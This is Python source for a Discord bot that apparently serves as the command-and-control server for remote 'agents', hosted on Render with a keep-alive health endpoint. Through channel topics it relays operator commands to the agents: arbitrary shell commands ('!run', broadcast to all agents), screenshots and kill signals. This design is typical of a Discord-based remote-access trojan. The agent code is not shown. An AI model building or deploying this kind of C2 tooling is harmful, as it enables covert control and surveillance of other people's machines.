import discord
from discord.ext import commands
import os
import asyncio
from aiohttp import web  # For the HTTP server

# Read configuration from environment variables
BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
GUILD_ID = int(os.getenv("DISCORD_GUILD_ID", 0))
CONTROL_CHANNEL_NAME = os.getenv("CONTROL_CHANNEL", "control")
AGENT_CHANNEL_PREFIX = os.getenv("AGENT_PREFIX", "agent-")
PORT = int(os.getenv("PORT", 10000))  # Render sets this automatically

# Validate required variables
if not BOT_TOKEN:
    raise ValueError("DISCORD_BOT_TOKEN environment variable not set")
if not GUILD_ID:
    raise ValueError("DISCORD_GUILD_ID environment variable not set")

# Bot setup
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.messages = True

bot = commands.Bot(command_prefix="!", intents=intents)

# ---------- HTTP Server for Render Health Checks ----------
async def handle_health(request):
    return web.Response(text="OK")

app = web.Application()
app.router.add_get("/", handle_health)
app.router.add_get("/health", handle_health)

async def start_http_server():
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    print(f"HTTP health check server running on port {PORT}")

# ---------- Discord Bot Events ----------
@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    guild = bot.get_guild(GUILD_ID)
    if guild:
        control = discord.utils.get(guild.channels, name=CONTROL_CHANNEL_NAME)
        if not control:
            await guild.create_text_channel(CONTROL_CHANNEL_NAME)
            print(f"Created #{CONTROL_CHANNEL_NAME} channel")
    print("Bot is ready!")

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    if message.guild.id != GUILD_ID:
        return
    await bot.process_commands(message)

@bot.command(name="agents", help="List all active agents")
async def list_agents(ctx):
    if ctx.channel.name != CONTROL_CHANNEL_NAME:
        await ctx.send("This command can only be used in the #control channel.")
        return
    guild = ctx.guild
    agent_channels = [ch for ch in guild.text_channels if ch.name.startswith(AGENT_CHANNEL_PREFIX)]
    if not agent_channels:
        await ctx.send("No agents currently connected.")
        return
    embed = discord.Embed(title="Active Agents", color=0x00ff00)
    for ch in agent_channels:
        topic = ch.topic or "No info"
        embed.add_field(name=f"#{ch.name}", value=topic, inline=False)
    await ctx.send(embed=embed)

@bot.command(name="broadcast", help="Send a command to all agents")
async def broadcast(ctx, *, command):
    if ctx.channel.name != CONTROL_CHANNEL_NAME:
        await ctx.send("This command can only be used in the #control channel.")
        return
    guild = ctx.guild
    agent_channels = [ch for ch in guild.text_channels if ch.name.startswith(AGENT_CHANNEL_PREFIX)]
    if not agent_channels:
        await ctx.send("No agents to broadcast to.")
        return
    for ch in agent_channels:
        await ch.edit(topic=f"cmd:run {command}")
    await ctx.send(f"Broadcast command `{command}` to {len(agent_channels)} agents.")

@bot.command(name="killall", help="Kill all agents")
async def kill_all(ctx):
    if ctx.channel.name != CONTROL_CHANNEL_NAME:
        await ctx.send("This command can only be used in the #control channel.")
        return
    guild = ctx.guild
    agent_channels = [ch for ch in guild.text_channels if ch.name.startswith(AGENT_CHANNEL_PREFIX)]
    for ch in agent_channels:
        await ch.edit(topic="cmd:kill")
    await ctx.send(f"Kill signal sent to {len(agent_channels)} agents.")

# Commands inside agent channels
@bot.listen()
async def on_message(message):
    if message.author == bot.user:
        return
    if message.guild.id != GUILD_ID:
        return
    if not message.channel.name.startswith(AGENT_CHANNEL_PREFIX):
        return
    content = message.content.strip()
    if content.startswith("!run "):
        cmd = content[5:].strip()
        await message.channel.edit(topic=f"cmd:run {cmd}")
        await message.add_reaction("✅")
    elif content == "!screenshot":
        await message.channel.edit(topic="cmd:screenshot")
        await message.add_reaction("✅")
    elif content == "!kill":
        await message.channel.edit(topic="cmd:kill")
        await message.add_reaction("✅")

# ---------- Main Entry Point ----------
async def main():
    # Start HTTP server for Render health checks
    asyncio.create_task(start_http_server())
    # Start Discord bot
    await bot.start(BOT_TOKEN)

if __name__ == "__main__":
    asyncio.run(main())
